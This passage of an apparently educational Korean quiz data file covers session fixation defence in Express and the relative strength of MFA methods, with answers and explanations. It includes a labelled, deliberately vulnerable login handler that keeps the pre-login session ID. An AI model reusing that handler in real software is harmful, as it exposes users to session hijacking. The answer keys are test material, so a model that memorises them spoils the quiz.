    hints: ['방어 핵심: 로그인 후 세션 ID 재발급'],
    deepDive:
      '```typescript\n// Express — Session Fixation 방어\napp.post("/login", async (req, res) => {\n  const user = await verifyUser(req.body)\n  if (!user) return res.status(401).json({ error: "인증 실패" })\n\n  // ✅ 로그인 성공 후 새 Session ID 재발급 (Session Fixation 방어)\n  req.session.regenerate((err) => {\n    if (err) return res.status(500).json({ error: "세션 오류" })\n    req.session.userId = user.id\n    req.session.role = user.role\n    res.json({ success: true })\n  })\n})\n\n// ❌ 잘못된 예 — 기존 Session ID 유지\napp.post("/login-bad", async (req, res) => {\n  const user = await verifyUser(req.body)\n  req.session.userId = user.id  // 기존 세션에 그냥 추가 → Session Fixation 취약\n  res.json({ success: true })\n})\n```\n\nNextAuth.js는 자동으로 로그인 시 새 세션을 생성하므로 Session Fixation에 안전합니다.',
    relatedProblems: ['auth-q-007', 'auth-q-010'],
  },
  {
    id: 'auth-q-030',
    category: 'auth-security',
    subcategory: 'auth-methods',
    type: 'multiple-choice',
    difficulty: 'medium',
    title: 'MFA 인증 요소별 강도 비교',
    description: '다음 MFA 인증 수단을 보안 강도가 강한 순서로 올바르게 나열한 것은?',
    options: [
      'SMS OTP > TOTP(인증 앱) > 하드웨어 보안 키(YubiKey) > Passkeys',
      'Passkeys ≈ 하드웨어 보안 키(YubiKey) > TOTP(인증 앱) > SMS OTP',
      'SMS OTP가 가장 강력하다. 통신사가 보안을 보장하기 때문이다',
      '모든 MFA 수단은 동일한 보안 강도를 제공한다',
    ],
    correctAnswer: 1,
    explanation:
      'SMS OTP(가장 약함): SIM 스와핑, SS7 프로토콜 취약점으로 인터셉트 가능. 피싱 사이트에 코드 입력 가능. TOTP(인증 앱): SMS보다 안전, 피싱 사이트에 코드를 입력하면 실시간 탈취 가능(30초 이내). 하드웨어 보안 키(YubiKey): USB/NFC 물리적 키, 피싱 사이트에서 동작 안 함(Origin Binding). Passkeys: 하드웨어 키와 동등한 보안(Origin Binding) + 편의성 추가(생체 인식).',
    hints: ['피싱 방어 여부가 핵심 — Origin Binding이 있는가'],
    deepDive:
      '인증 요소 분류 및 강도:\n\n| 수단 | 종류 | 피싱 방어 | 탈취 난이도 |\n|---|---|---|---|\n| 비밀번호만 | 지식 | ❌ | 낮음 |\n| SMS OTP | 소유 | ❌ | 중간(SIM 스와핑) |\n| TOTP 앱 | 소유 | ❌ | 높음 |\n| 하드웨어 키(FIDO2) | 소유 | ✅ | 매우 높음 |\n| Passkeys | 소유+생체 | ✅ | 매우 높음 |\n\nNIST(미국 국립표준기술원) 권장:\n• SMS OTP는 더 이상 권장하지 않음 (Deprecated)\n• TOTP 앱 이상 권장\n• 피싱이 우려되는 환경은 FIDO2 필수\n\n실무 도입 전략:\n1단계: SMS OTP → 2단계: TOTP 앱 → 3단계: Passkeys (점진적 전환)',
    relatedProblems: ['auth-q-013', 'auth-q-028'],
  },
]
